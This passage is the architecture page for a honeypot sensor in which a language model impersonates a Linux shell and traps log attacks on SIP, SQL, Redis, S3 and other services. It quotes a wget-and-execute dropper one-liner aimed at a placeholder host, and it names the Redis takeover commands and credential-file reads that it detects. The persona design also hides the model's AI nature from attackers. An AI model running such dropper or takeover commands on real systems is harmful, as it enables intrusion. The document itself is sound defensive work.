# Architecture

This page describes the components, how data moves between them, the log format they share,
and the budgets that bound model use. Related pages:
[scenarios](scenarios.md), [playbooks](playbooks.md), [operations](operations.md),
[security model](security-model.md).

## Components

The system has two halves. **Front-ends** face attackers and write events. **Agents** read
those events afterwards and produce records, reports, tuning changes and responses. The two
halves share files, never a network connection.

| Component | Location | Role |
|---|---|---|
| SSH honeypot | `SSH/ssh_server.py`, `agents/hooks.py`, `agents/shell.py` | The upstream DECEIVE server: a model plays a Linux shell. `ssh_server.py` stays close to upstream; each addition is a small call into `agents/hooks.py`, marked with an `agent layer` comment. |
| Listeners | `listeners/` | Low-interaction traps for SIP (UDP and TCP), FTP, Telnet, PostgreSQL, MySQL, MSSQL, Redis, SMTP, HTTP, HL7 MLLP and S3-compatible storage, all in one asyncio process (`python -m listeners`). |
| Scenarios | `scenarios/` | One strict schema describing the fake target; loader, synthetic-data checker and describer. See [scenarios.md](scenarios.md). |
| Budgets | `agents/budget.py` | Spend and concurrency limits for every model call, shared by the SSH and listener processes. |
| Triage | `agents/triage.py`, `agents/sessions.py` | Turns the log into one validated record per SSH session or trap campaign; writes the daily digest. |
| Response | `agents/respond.py`, `agents/playbooks.py`, `agents/source_state.py`, `agents/connectors/` | Runs playbooks on new records. See [playbooks.md](playbooks.md). |
| Tuner | `agents/tuner.py` | Adjusts fake accounts, SIP extensions, lures and login thresholds in the overlay. |
| Detect | `agents/detect.py` | Writes Sigma rule drafts and blocklist candidates to `detections/pending/`. |
| Event export | `agents/ship.py` | Copies new event log lines to S3 as JSON lines for a SIEM (`[connector.s3_events]`, off by default). See [operations.md](operations.md#event-export-to-s3). |
| Operator console | `agents/ui/` | `python -m agents ui`: a local web console over the records, queue, digests, tuner state, playbooks and detections. Read-only unless actions are on; loopback only. See [operations.md](operations.md#operator-console) and [security-model.md](security-model.md#operator-console). |
| CLI | `agents/__main__.py` | `python -m agents <command>`; `run-all` runs triage, respond, digest, tune and detect in that order, then the event export when it is enabled. |

### SSH persona

Every persona model call goes through `agents.hooks.persona_invoke`, which:

1. reserves the estimated cost in the budget, and returns a canned
   `fork: Resource temporarily unavailable` reply (and the session closes) when a limit
   would be exceeded;
2. adds the active scenario's host profile to the prompt, pinned for the whole session so
   a returning attacker sees the same host;
3. applies the source's tarpit delay, if a playbook set one.

If the model call fails (provider error, timeout), the session continues with a plausible
canned reply instead, from the deterministic shell in `agents/shell.py` (below), followed
by a prompt; `exit` or `logout` end the session. If the configured provider needs an API
key from the environment (`anthropic`, `openai`, `gemini`, `azure`) and the variable is not
set, the persona runs offline from the start: no network attempt is made and every command
gets a canned reply. A warning is logged once at startup. Offline replies charge no tokens
to any budget; the per-session command cap and the concurrency limits still apply.

#### Deterministic shell

`agents/shell.py` is the one answerer for the SSH fallback and the Telnet trap's canned
shell, so the two cannot disagree. It answers, from the scenario's host profile
(`[identity]` and `[identity.hardware]`), the sensor seed and the clock, with no model and
no subprocess:

- identity and uptime: `uname` (all flags, real field order), `hostname`, `uptime` (also
  `-p`, `-s`), `whoami`, `id`, `w`, `nproc`, `free` (`-b`, `-k`, `-m`, `-g`, `-h`, `-t`),
  `df` (`-h`, paths), `ps` (plain, `aux`, `-ef`);
- files: `/proc/cpuinfo`, `/proc/meminfo`, `/proc/version`, `/proc/uptime`,
  `/proc/loadavg`, `/proc/mounts`, `/etc/os-release`, `/etc/issue`, `/etc/hostname`,
  `/etc/passwd` (the scenario's users plus the login account), `/etc/shells`, and the
  distribution's own release files (another distribution's are "No such file");
- hardware: `lscpu`, `lspci`, `nvidia-smi` (plain, `-q`, `-L`, `--query-gpu` with CSV
  output), or `command not found` when the profile has no GPU;
- `which`, `command -v`, `ls` (and `cd`, `pwd`) of `/`, `/home`, `/tmp`, `/var/tmp`,
  `/dev/shm`, `/root`, `/opt`, `/srv`, `/mnt`, `/media` and home directories, showing the
  scenario's lures where they live;
- the IoT botnet openers: `sh` (a nested shell, no output), `enable` (bash's list of
  builtins: both front ends present bash, and a bot sending it reads nothing from the
  reply), `system`, `shell`, `linuxshell` and any other word that names no builtin, alias
  or program the host's `ls` of the bin directories or its `ps` shows (`command not found`,
  as bash says; a program a working server very often has beyond the minimal image, such
  as `ss`, `vim`, `journalctl` or `docker`, goes to the model), and `busybox NAME` (`NAME: applet not found`), with the BusyBox version the
  distribution release ships; RHEL and its rebuilds ship none, so there `busybox` is
  `command not found`;
- `wget`, `curl`, `tftp` and `busybox ftpget`, which exist but fail (no route, or no
  name resolution) without any lookup or connection;
- `echo` (including `-e` escapes) and the quiet builtins;
- `sh -c SCRIPT` (and `bash -c`) for the short scripts bots send to test a shell: `printf`
  with `%s`, `%d`, `%i`, `%%` and `\n`, `\t`, `\r`, `\\`, `echo` without options or
  backslashes, `$((...))` with `+ - * / %` in 64-bit arithmetic, `$$`, `$#`, `$0` to `$9`,
  `set --`, `true`, `false`, `:`, functions and `{ }` groups, joined by `;`, `&&` and `||`.
  A backslash follows the POSIX rule, in the script and on the line: inside double quotes
  it quotes only `$`, `` ` ``, `"`, `\` and a newline and stays before anything else; outside
  quotes it quotes the next character. The output is what dash and bash print. `$$` is a pid between the login shell's in `ps`
  and the last pid in `/proc/loadavg`, the same throughout one script and higher in each
  later one. A script is at most 1024
  characters and runs at most 256 commands; anything else in it leaves the whole line to
  the model;
- `/proc/self/cmdline`, the reading program's arguments as typed, each ended by a NUL.

A command given by path (`/bin/uname`, `/bin/./uname`, `/usr/bin/id`) answers the same.
Pipelines of that output through `grep` (`-c`, `-i`, `-v`, `-n`, `-q`, `-F`, `-e`),
`head`/`tail -n`, `cut -d -f/-c`, `wc` and `awk '{print $N, ...}'` (with `-F`) are
evaluated in Python, as are `;`, `&&` and `||` lists of them and `( list )` subshells,
whose `cd` stays inside and whose output goes through the group's own redirections. `grep` patterns are fixed
strings plus `.`, `^` and `$`, matched by hand; no attacker text is ever compiled as a
regular expression, and the module's own parsing of attacker text (words, `awk` programs,
`cut` lists, counts, `echo -e` escapes) is a single linear pass.

This code runs on the event loop, so one line's cost is bounded as a whole: every command
and filter charges one work counter per character and per loop step, every command's output
is capped at 128 KiB (the line's at 128 KiB too), and a command reads at most 8 files. A
line over any of these limits falls back like an unknown line. The worst line we could
construct on the largest valid profile (64 CPUs, 8 GPUs) costs about 12 ms. Input over
4096 characters, more than 8 commands in a pipeline or 32 in a list, control characters,
substitution, variables, globbing, and any command, option or file it does not
know fall back too: to the model; without one, to a builtin's own output, the known tool's
own error for an option or file it does not handle (`invalid option`, `No such file or
directory`) or no output, and `command not found` only for a command the host does not
have. Errors from the shell itself are worded as bash words them: `-bash: ...` in an
interactive session, and over SSH exec `bash: line 1: ...` (bash 5.1 and later, by the
scenario's distribution release) or `bash: ...` (older bash). `/proc/meminfo` and `free`
report whole 4 kB pages.

The canned shell also answers what IoT loaders send (Mirai, Gafgyt-style droppers): a list
runs part by part, `ping`, `nc` and bare `busybox APPLET` print their real usage (recorded
from the distribution's busybox package), and `/bin/echo`, `/bin/busybox` and
`/proc/self/exe` read as the start of an ELF image for the host's machine
(`agents/elfimage.py`), the same bytes through `cat`, `dd` and a `while read` loop. Files a
Telnet session writes (`>x`, `cp`, `chmod`, `echo -ne ... >> x`) are kept in memory for
that session (32 entries, 128 KiB) and never run. In a system directory whose listing the
shell does not have (`/etc`, `/usr`, `/var`, `/dev`, `/run`), a session makes only a dot
name or a one-character name (`/var/.f`, `/var/d`), which is never one of the host's own
entries there; `ls -la /var/d`, `cat`, `rm` and running it answer from the session, and a
listing of the whole directory goes to the model. A dropper such as
`(wget http://ADDR/x -O- || busybox wget http://ADDR/x -O-) > x; chmod 777 x; ./x` prints
both download errors, leaves `x` empty, and an empty file runs as an empty script. The
`tftp -g` form goes to the model: the tftp clients print different things for busybox's
options. Without a model, that transfer fails as a timeout. Binary bytes leave as the exact bytes;
the event log and the model's history keep `\xNN` text instead.

With a model and `[llm] local_shell_replies = true` (the default), a line the shell can
answer is answered from the profile, by how far its commands could disagree with what the
session has done (`agents.shell.FIXED`, `SESSION`, `STATE`; a line takes the highest):

- Facts no command can change are answered locally for the whole session: the kernel
  (`uname` without the nodename), `uptime`, `w`, `who`, `nproc`, `free`, `lscpu`, `lspci`,
  `nvidia-smi` on a GPU host, the `/proc` CPU, memory, version, uptime and load files,
  `/proc/self/cmdline`, `echo`, `sh -c` scripts, an empty line, the IoT openers and
  `busybox` applet probes.
- Facts a session can change (`hostname`, `uname -n` and `-a`, `whoami`, `id`, `which`,
  `command -v`, `ls`, `pwd`, `ps`, `df`, `sh`, every file outside those `/proc` files,
  including `/etc/os-release` and the other release files, a file that does not exist, a
  program path that does not exist, such as `/usr/bin/xmr`, and a command the host does
  not have) are answered locally only
  until a model reply (fresh, cached or learned) has answered a command in the session; after that
  the model answers them, because it may have run `hostname x`, `useradd`, written a file
  or downloaded a program. The model's own session opener does not count.
- Commands that change the session (`cd`, `export`, `unset`, `history`, `wget`, `curl`,
  `tftp`) always go to the model, which then owns the change.

A local answer given after the model has answered ends with exactly the prompt the model
last showed (the last line of its reply), and paths resolve from the directory that prompt
shows: `user@host:DIR# `, or `[user@host ~]# ` and `[user@host /]# ` on RHEL. When the
prompt has any other shape (`export PS1='$ '`, or RHEL's `[root@host tmp]# `, which shows
only the last path component), the session gets no more local answers; the model answers
everything from then on. Local answers cost no model call, count
against the per-session command cap but not the model cap, follow the source's `shallow`
mode, and are added to the session's chat history (each clipped to 4 KB) so the model's
later replies agree with them; those characters count in the token estimate made before
each model call. A session whose commands were all answered this way gets no model
summary. When the model fails after it has moved the session to another directory, the
fallback reply keeps the prompt (and working directory) the model last showed.

The persona block tells the model the exact line bash prints for a program the host does
not have (`-bash: NAME: command not found` in a login shell, `bash: line 1: NAME: command
not found` over SSH exec on bash 5.1 and later), so it answers an unknown program the way
the shell would instead of inventing output.

A model reply that reads as the model talking and not as shell output (for example "As an
AI", "I'm sorry, but", "I apologize, but", or a mention of its instructions or system
prompt; straight and curly apostrophes alike) is not sent. A phrase counts only in the
first two non-empty lines of the reply, or anywhere when the reply has no shell prompt
line; for content viewers (`cat`, `less`, `more`, `head`, `tail`, `man`, `grep`,
`strings`, `git log`) only in the first line, so file text that mentions a language model
passes. The attacker instead gets what a shell would print: for `echo` or `printf` of
literal arguments the real output computed in code, for anything else empty output, then
the prompt (`#` for root, `$` otherwise). The sent text also replaces the model's reply in
the session history, so the model never sees its own break again. A `Persona break` event
records the original reply (base64 in `details`, clipped to 2,000 characters).

Before a reply is replaced, the model is asked again (`[llm] persona_retries`, default 1,
at most 2, 0 replaces at once). This happens for a reply that breaks character, an empty
interactive reply, a reply that is empty once code fences are stripped, and an `echo` or
`printf` reply that misprints its literal text. The retry sends the same input with a short
note in the persona block naming the problem and two example terminal replies. It is
charged to the budget like any call and counts as one command with the first. The session
history keeps only the reply that is sent. Each retry logs a `Persona retry` event with
`reason` (`persona_break`, `empty` or `literal_mismatch`) and `attempt`; telnet logs it
as a `notice`. If the last reply is still rejected, it is replaced as described here, and
an empty reply after a retry is replaced the same way. A phrase
the attacker typed themselves is allowed through. The check is a short list of patterns in
`agents/hooks.py`; it catches the common ways a model steps out of the role, not every
one.

A model reply is first cut back to the one round the input asked for (`agents/onereply.py`),
before it is sent, kept in the history or the reply cache, logged, or read for the prompt.
The first line that starts with the session's prompt (`user@host:dir#`, or `[user@host
dir]#` on RHEL; the host is the scenario's, the one in the prompt noted for the session,
or the one the reply ends with, or any host when the prompt shows the session's own user)
and has a command or more output after it ends the reply:
an interactive reply keeps that prompt and nothing after it, an exec reply loses the prompt
too. The attacker's own line echoed back after a prompt at the start of a reply, and a
bare prompt in front of the output, are dropped (a line that is only the input, with no
prompt in front, is kept: it may be the output). A reply is left whole when
the input could print a prompt-shaped line itself (it contains `@`, a backtick, a
backslash, `%` or a `$` expansion), and for content viewers only the session's exact
current prompt counts, and nothing at all once the session has typed such an input. Each
cut logs one `Reply cut` event (`cut_reason`, `dropped_chars`, `cuts_in_session` and a
`dropped_sample` of at most 120 escaped characters; telnet: a `notice` event with the same
`data`); the dropped text is never recorded as input. The template system prompt also asks
for one round, and `[llm] max_tokens` caps the reply on the anthropic provider. No stop
sequence is used: the prompt the model must print is the same text that starts an
invented round.

Sessions have a login timeout (60 s), an idle timeout (300 s) and an absolute lifetime
(1800 s); each frees a concurrency slot. Chat history is dropped when a session closes. The
session summary at the end uses the same budget and is skipped when the session ran no
model-backed command.

Telnet uses the same persona path, with the `[llm]` provider, when `[listeners] llm = true`
and that provider's API key is present (providers without a key, such as Ollama or Bedrock,
count as available); otherwise it answers with a small deterministic shell.

### Listeners

All listeners share one event loop, so anything that blocks it takes every protocol down.
And with the default `after_n` login policy any client gets in within a few tries, so all
post-login code is treated as reachable without authentication. The shared framework in
`listeners/base.py` therefore enforces:

- connection slots globally, per source (IPv6 per /64), per service and per source per
  service, plus a per-source connection rate;
- shorter read timeouts before login than after; connections that send almost nothing
  within `progress_window` seconds are closed;
- per-line, per-connection byte and per-connection command caps;
- no regular expression or `fnmatch` on attacker-supplied patterns: SQL `LIKE` uses a
  linear matcher and Redis glob patterns use `listeners/glob.py` (linear time, 256-byte
  cap);
- repetitive low-value events (refused connections, malformed datagrams) are logged once,
  then as periodic counters, under a global events-per-second ceiling;
- exceptions never escape a handler: they are logged as an `error` event and the
  connection is closed.

Login policy per service: `all` (any credentials), `listed` (only configured accounts),
`after_n` (accept after a random number of attempts between `after_n_min` and
`after_n_max`, per source) or `none`.

Protocol notes:

- **SIP** (`listeners/sip.py`): `REGISTER` gets a Digest challenge; the password is
  recovered when it is a configured extension password, a common password or the username.
  `INVITE` is logged with the dialed number and always ends in 486 or 480; from a source
  with no live registration it is first challenged with 407. Over UDP there is at most one
  response per request, responses are never larger than the request (compact header names,
  optional headers dropped, otherwise no answer), more than 5 Via hops and SIP responses are
  never answered, and per-source and global response rates are capped. An answered
  `INVITE` from a verified source (see below) gets `100 Trying` and `180 Ringing` before
  the final response when all three together fit in the request's size and in the
  source's remaining response allowance; otherwise only the final response. Over TCP it
  always gets all three.
  `[listeners] sip_udp_slack_bytes` (0 to 512, default 0) lets a response exceed its
  request by that many bytes, so that minimal REGISTERs from clients such as `sipsak` get
  their 401 challenge, at the cost of a small, rate-capped amplification factor. A UDP source
  counts as verified only after it echoes a nonce the trap issued, and every UDP event
  says which it is (`data.source_verified`). Each datagram passes the per-source request
  limit first, then a global inbound limit (`udp_requests_per_second`, default 200), both
  before any parsing, so one busy source cannot use up the shared budget; datagrams over
  the global limit are dropped and reported in one aggregated `limit` event per
  minute. Events from unverified UDP sources go through the low-value gate in a pool of
  their own (first event of each kind per source, then periodic lines with a `suppressed`
  count), so log growth does not depend on how many source addresses a flood forges, and a
  forged flood cannot crowd out log lines about real sources.
- **Low-value gate**: refused connections, malformed input and unverified-source events
  are logged once per source and reason, then at most once per minute with a `suppressed`
  count, under per-second ceilings (`low_value_events_per_second` and
  `unverified_events_per_second`). Counts that never got a line of their own (sources that
  never returned, keys evicted from memory, lines over a ceiling) are written every minute
  as one `Suppressed N low-value log lines` event per protocol and pool (`src_ip` `-`,
  `data.reason` `suppressed_summary`). Triage keeps these sensor-level lines, and the
  inbound drop lines, per day, and the digest lists them under "Sensor limits".
- **FTP**: passive mode only, on `ftp_pasv_ports`, advertising `ftp_pasv_address` (default:
  the control connection's local address). Data connections are accepted only from the
  control connection's source. `PORT`/`EPRT` are refused with vsftpd's own replies
  (`500 Illegal PORT command.`, `500 Illegal EPRT command.`, or the EPRT parse errors).
  `HELP`, `STAT`, `ALLO`, `SITE` and `RMD` (550 on a
  non-empty directory) answer as vsftpd, or as ProFTPD when the banner names it. An unused passive listener
  closes after `ftp_pasv_accept_timeout` seconds (default 30), and one source may hold at
  most `ftp_pasv_per_ip` open passive listeners (default 2). Uploads stream into the
  quarantine with caps enforced while reading; upload bytes are bounded by the quarantine
  caps, not by `max_conn_bytes`. An upload over `quarantine_max_file_bytes` is cut at the
  cap, stored, and logged as truncated with the size and SHA-256 of the part kept; over a
  per-source or total quota reading stops and nothing is stored. Identical files are stored
  once; hitting a quota is a high-signal event. A session's fake tree holds at most 500
  files and directories (parents included) and paths at most 32 components deep.
- **PostgreSQL**: SSL requests are declined; md5 password exchange by default (the password
  is recovered from the bundled common-password list when possible), `postgres_auth =
  cleartext` for the cleartext exchange. Simple query protocol, with best-effort extended
  protocol support so drivers do not hang: Bind parameters are bound into the statement,
  and a Describe of a prepared statement runs only a read, so a write runs once.
- **MySQL**: `mysql_native_password` handshake without TLS; the password is recovered from
  the scramble for native and `caching_sha2_password` clients. Prepared statements
  (`COM_STMT_PREPARE`, `EXECUTE`, `SEND_LONG_DATA`, `RESET`, `CLOSE`) bind parameters into
  the statement as literals and answer with binary-protocol rows; at most 32 statements and
  256 KB of long data per connection. `COM_CHANGE_USER` is a new login under the same
  policy; `COM_SET_OPTION` turns multi-statement queries on and off.
- **MSSQL**: TDS 7.x without TLS. `PRELOGIN` is answered with "encryption not supported";
  a client that requires encryption is logged and disconnected. Works with impacket
  `mssqlclient` and `sqlcmd` using ODBC Driver 13; ODBC Driver 18 requires encryption by
  default and is refused. RPC calls to `sp_executesql`, `sp_prepare`, `sp_execute`,
  `sp_prepexec` and `sp_unprepare` bind their parameters into the statement (positional
  values in declaration order, named values by name) and answer it; any other procedure gets
  the EXECUTE permission error. A request that batches several calls gets each answered in
  order, up to 20; the calls before a malformed one or past the 20th are answered, then the
  protocol error is sent and the connection is closed. Enabled in the `contact_center`
  scenario.
- **SQL** (all three): statements go to `listeners/sqlfake.py`, an in-memory fake engine.
  File, program and command-execution primitives get a believable permission error and a
  `sql_exec_attempt` signal; catalog queries and scenario tables get canned or generated
  answers; anything else may go to the budgeted model (when `[listeners] llm = true`)
  through a strict schema, with worked examples for the dialect on a second request.
  When no answer comes, a statement that starts with a known verb for the dialect and has
  balanced quotes and parentheses gets an answer by kind: an empty result set with
  columns read from the select list for `SELECT`, `WITH`, `SHOW` and similar reads, OK
  for a write or DDL, and a permission error for `CALL`, `EXEC` and admin verbs. Anything
  else gets a syntax error. The statement's event has `kind` `llm`, `llm_retry` or
  `fallback`. A write or DDL verb from another dialect (`VACUUM` on MySQL, `REPLACE INTO`
  on PostgreSQL, `CREATE LOGIN` outside MSSQL) gets the dialect's syntax error.
  Each connection keeps what it creates until it ends: databases, tables with their
  columns and the rows of `INSERT ... VALUES` with literal values (at most 50 tables, 100
  rows per table, 64 KiB of text), and users, roles and logins with what `GRANT` and
  `REVOKE` give them (at most 20 names, 20 grants each). A created table belongs to the
  database that was current (or named) when it was made: `SHOW TABLES`,
  `information_schema.tables`, `pg_tables`, psql's `\dt` and `sys.tables` list it for that
  database, `SELECT` and `COUNT(*)` return its rows, and dropping a created database drops
  its tables. A scenario table keeps its name and rows; `pg_roles`, `pg_user` and psql's `\du` list created
  roles, and MySQL `SHOW GRANTS FOR` shows a created account's grants. Reads of
  `mysql.user` and `sys.sql_logins` stay refused. A model request carries this state and
  the connection's last 12 statements, each with its answer's kind and row count or error
  code (at most 2000 characters, inside the untrusted block).
- **Redis**: RESP and inline protocol, fake per-connection keyspace (strings, hashes, lists
  and sets, with TTLs; at most 10,000 keys). The takeover chain (`CONFIG SET
  dir/dbfilename`, `SAVE`, `SLAVEOF`/`REPLICAOF`, `MODULE LOAD`, `EVAL`, `FLUSHALL`)
  answers plausibly and is logged as high-signal; nothing touches disk or connects out.
  `SAVE` and `BGSAVE` move `LASTSAVE` and `INFO persistence` as a real save would. `EVAL`
  never runs Lua: `return` of an integer, a string, `KEYS[n]` or `ARGV[n]`, and
  `redis.call('get'|'set', ...)` are answered against the keyspace, anything else gets a
  nil reply. A real Redis command the trap does not implement may go to the budgeted
  model (when `[listeners] llm = true`) through a schema limited to RESP reply types,
  with worked examples on a second request; a name that is not a Redis command, or no
  answer, gets the real unknown-command error. The command's event has `rung` `llm`,
  `llm_retry` or `fallback` when the model was asked.
- **SMTP**: Postfix-like; captures `AUTH`; messages after `DATA` are logged (headers,
  recipients, size, SHA-256, first 2 KB) and discarded. Recipients outside the scenario
  domain are relay attempts. As Postfix without TLS: `STARTTLS` is not advertised and
  answers 502, `HELP` and `EXPN` answer 502, `ETRN` is refused with 554. The advertised
  `SIZE` is the limit `DATA` enforces (Postfix's 10,240,000, or `max_conn_bytes` less
  64 KiB when that is smaller), and `MAIL FROM` with a larger `SIZE=` gets 552.
- **HTTP**: login form and Basic, Bearer and API-key capture; after login a small site and
  JSON API built from the scenario. Unknown routes under the API prefix may be answered by
  the budgeted model when the scenario enables `llm_unknown_api_routes`; otherwise 404.
  Other unknown paths get fixed answers for the most-probed paths (`/robots.txt`, lure
  files that hold only honeytokens this sensor issued, the server's own 404 or 403), then
  for a plain GET the budgeted model (`llm_unknown_paths`), which sees only the method and
  path, answers with no headers, is filtered for scripts, redirects, foreign links and
  credential-shaped text, and is cached per path; the fallback is the server's 404. The
  event's `rung` is `llm`, `llm_retry` or `fallback`, with `cache_hit` on a cached answer.
- **HL7 MLLP**: frames are logged and answered with an `AA` acknowledgement; nothing is
  forwarded. A `QRY^A19` query gets `ADR^A19` and a `QBP^Q22` query gets `RSP^K22`, each
  with `QAK` status `NF` (no data found) and the query segment echoed (sanitised and
  bounded).
- **S3**: enough of the S3 REST API (plain HTTP, path-style and virtual-hosted) for the AWS
  CLI, boto3, s3cmd and curl: ListBuckets, HeadBucket, GetBucketLocation, GetBucketAcl and
  GetBucketPolicy (canned), ListObjects V1 and V2 (prefix, delimiter, `max-keys` up to
  1,000, continuation, `encoding-type=url`), HeadObject, GetObject with `Range`, PutObject,
  DeleteObject(s), CopyObject between objects the source can see, multipart upload with
  ListParts and ListMultipartUploads, Get/Put/DeleteObjectTagging (per source, at most
  10 tags per object and 1,000 tagged objects per source), GetBucketVersioning (never
  enabled) and GetBucketTagging (`NoSuchTagSet`); everything else, including CreateBucket
  and DeleteBucket, is a correct S3 XML error. Buckets and objects come from the scenario; object bodies are text, a scenario
  table as CSV, or deterministic filler generated per byte range, never the size on paper.
  SigV4 (header and presigned) and SigV2 are parsed for the access key id, region and
  signed headers; access follows the login policy keyed on the access key id, a SigV4
  signature is verified only for a scenario account with a secret, and `public_list` /
  `public_read` buckets answer anonymous requests. A planted access key id is accepted
  unless the policy is `none`, and is always logged as `s3_planted_key` with the token
  name. Upload bodies stream to the quarantine (FTP caps and truncation; `Expect:
  100-continue` and `aws-chunked` handled; each multipart part is its own quarantine entry)
  and the object is then listed for that source only, for an hour. Signals: `s3_list`,
  `s3_download`, `s3_bulk_download` (25 downloads or 64 MB from one source within 10
  minutes, high-signal), `s3_upload` (high-signal), `s3_planted_key` (high-signal).
  Deterministic triage maps successful listings to Discovery (T1619), a bulk download to
  data theft at Collection (T1530) and an upload to T1105; the `malware_drop` playbook
  fires on `s3_upload` and `honeytoken_reuse` on a planted key.

### Triage

`python -m agents triage` reads the log from a high-water mark (byte offset plus the file's
inode), groups events, and writes one `TriageRecord` (JSON) per item to `reports/`:

- **Sessions**: SSH connections where the attacker ran at least one command.
- **Campaigns**: everything else, aggregated per source, per protocol, per time window
  (60 minutes). A brute forcer making thousands of connections becomes one record. IPv6
  sources are grouped by /64, like every other per-source control: the record's `src_ip`
  is the /64, `src_addresses` keeps up to 20 of the addresses seen and
  `src_address_count` counts them all.
  Unverified UDP sources (seen only over UDP, no nonce round trip; the address may be
  forged) are folded into one aggregate record per protocol and window, with source
  `unverified`; while parsing, at most 1,000 such sources per window get their own
  campaign and counters per campaign are bounded.

At most `[agents] max_records_per_run` records (default 1,000) are written per run; the rest
stay pending for the next run. Session and campaign records older than
`[agents] record_retention_days` (default 90; 0 keeps them) are removed at the end of each
triage run.

Each record carries intent, kill-chain stage, skill, judgement, MITRE technique IDs, IOCs,
a short narrative, high-signal counts, honeytoken use and credential statistics. Values
come from the analyst model when one is used and validate against a strict schema;
otherwise they are computed by code.

The narrative is laid out in parts so every record reads the same way:

| Field | What it holds | Cap |
|---|---|---|
| `headline` | a few words naming the activity | 100 characters |
| `actions` | what the source did, one short sentence each | 5 items, 160 characters each |
| `assessment` | what it most likely means | 4 items, 160 characters each |
| `not_seen` | what was looked for and not found | 5 items, 60 characters each |
| `narrative` | one plain paragraph, always filled | 600 characters |
| `clients` | campaigns: the most frequent client names the source announced | 3 items, 80 characters each |

The model writes `headline`, `actions`, `assessment` and `not_seen`; without a model the
rule-based triage fills them from the same facts it uses for judgement (signals, counts,
dialed numbers, honeytokens). The parts are forgiving where the rest of the schema is
strict: a part that is missing or of the wrong type is empty, an over-long one is clipped,
control characters become spaces, and the record is still written. The model is asked to
leave `narrative` empty and it is composed from the parts; a paragraph the model does give
is kept. `narrative` stays for everything that already reads it (connectors, the
`include_narrative` summary, search).

Who, volume and target are never written by the model. They are derived from the record
at display time (`triage.record_facts`): who from the source address, address count,
username and `clients`; volume from connections, login attempts, commands or requests and
high-signal counts; target from dialed numbers, SIP extensions, usernames tried and
honeytokens. Records written before the parts existed have them empty and are shown as
their paragraph.

Example (a rule-based SIP record, as the digest shows it):

```text
1. MALICIOUS / IMPACT / sip from `198.51.100.7` (`campaign-sip-198_51_100_7-20261101T1200`)
   - **`Toll-fraud probing over SIP`** (MALICIOUS)
   - Who: `198.51.100.7`, `client "examplesip"`
   - Volume: 6 connections, no login attempts, 6 requests, 6 x sip_dialed_number
   - Target: `number 0015550100`, `number 01115550100`, `number 915550100`, `1 more number`
   - What they did
     - `Dialed 6 outside numbers`
   - What it means
     - `Hostile: the activity goes beyond scanning or guessing`
     - `Looking for a route that places outbound calls at someone else's cost`
   - Not seen: `login attempts`, `honeytoken use`
```

Deterministic rules set floors the model cannot lower:

- In SSH sessions, code detects download-and-execute, persistence (cron, systemd, shell rc
  files, `authorized_keys`), and reads of credential files (`/etc/shadow`, SSH private
  keys, cloud and tool credential files). Each one, and any honeytoken use, makes the
  judgement `MALICIOUS` and raises the stage.
- Campaigns get a model look only when there was a fake login followed by activity, a
  high-signal event, honeytoken use or a matched behaviour rule, and the source is
  verified. Failed-only brute force
  is always handled by code.

Model-suggested IOCs are kept only if they appear verbatim in the transcript and match their
type's format.

HTTP campaigns also carry their request sequence and what it matched:

| Field | What it holds | Cap |
|---|---|---|
| `request_sequence` | the campaign's first requests in log order: `seq` (the listener's per-source request number) and `at` (the event time) to find the raw line, `offset` (seconds since the first), connection, method, path, query, status, route, user agent, and the listener's `lure`, `discovered_via`, `flow`, `flow_step`, `marker` and `marker_src` | 100 entries; path 300 and query 200 characters |
| `indicator_matches` | indicator entries matched over every user agent, kept request and source address: `id`, `framework`, `label`, `confidence`, `count` | 20 |
| `behaviours` | behaviour rules matched over the kept requests (up to 300 per campaign): `id`, `label`, `confidence`, `count`, `first_seq`, `last_seq` | 100 |

Indicator entries and behaviour rules are data files (`[indicators]`, `[behaviours]`; see
[detections/README.md](../detections/README.md)). Their matches are shown on the record,
in the digest and in the console, and playbooks can use them as conditions. They never
feed `judgement`, `high_signal`, blocklist reasons, OTX or STIX. A matched behaviour asks
the model for a narrative within the usual call caps; when it is the only reason for the
call, the model writes the narrative parts only and the judgement, stage, intent, skill,
techniques and IOCs stay the rule-based ones. The model sees the request sequence with
second offsets, not the match labels. A behaviour on a record that also matched an
indicator naming a framework is described as like that framework (for example
"ARTEX-like"), never as attributed to it. Records written before these fields existed load
with them empty.

Without any model configured (no Anthropic credentials, or `--no-llm`), every SSH session
and campaign gets a deterministic record. When a model is configured but temporarily
unavailable (rate limit, outage, timeout) or the call cap is reached, model work stops for
that run and the affected items are deferred to the next run; nothing is lost because the
cursor is saved after every item.

The digest (`reports/daily/YYYY-MM-DD.md`) lists counts, the top three items (honeytoken
use first, then judgement, stage, high-signal events and novelty), high-signal events,
credential statistics per protocol, and SIP extensions and dialed numbers. Each of the top
three is laid out as above (headline, who, volume, target, what they did, what it means,
not seen), or as its paragraph when the record has no parts. Attacker and model strings
are rendered inside escaped code spans.

### Tuner

`python -m agents tune` looks at the last 14 days of triage records and:

- adds fake accounts (for SSH and every listener service) and SIP extensions that
  attackers actually try;
- removes accounts it added itself once nobody has tried them for a full window (never a
  configured account, never the last account of a service);
- adds lure files built only from fixed allowlists of directories and bait names;
- adjusts `after_n` bounds.

It writes only the overlay (`$WINNIE_OVERLAY`, else `[scenario] overlay`, else
`decoy/overlay.json`). Every change
first stores a numbered snapshot, so any run can be undone (`tune --history`,
`tune --rollback N`). `--dry-run` prints the diff. `--git-commit` additionally commits the
overlay when running from a checkout; if the commit fails the overlay is rolled back.
Candidate selection is deterministic; the model may only reorder candidates by index. The
fences are listed in [security-model.md](security-model.md#tuner-fences).

The SSH server re-reads accounts from `config.ini` and the overlay when either file changes
(checked at the next login attempt) and reloads the host profile for new sessions;
listeners poll the overlay every 30 seconds. Configured accounts always win over overlay
accounts.

### Detect

`python -m agents detect` writes drafts only, to `detections/pending/`:

- Sigma rules for IOCs and high-signal behaviour seen across several sessions or sources.
  The rule body comes from a template in code; the model may only supply a title and
  description, which are length-capped and limited to a safe character set. Attacker values
  are escaped for Sigma; each indicator type has its own log source, and addresses and
  hashes get no rule. `pending/provenance.json` lists the triage records each draft was
  built from. See [Portable formats](portable-formats.md).
- `blocklist-candidates.csv`, one row per source across all protocols. Private, reserved
  and documentation addresses and unverified sources (see [Source proof](#source-proof))
  are skipped. Each row carries `source_proven`, a `reason` from a fixed vocabulary and an
  `expires` time; rows past their expiry are left out of the next run's file. See
  [Using the intelligence outside the sensor](operations.md#using-the-intelligence-outside-the-sensor)
  before acting on it.

See [detections/README.md](../detections/README.md).

### STIX export

`python -m agents stix` (and `run-all`, when `[stix]` is enabled; off by default) writes a
STIX 2.1 bundle to a local file: observed-data for proven sources and stored files, and
indicators only for what passed the OTX connector's promotion rules or an operator's
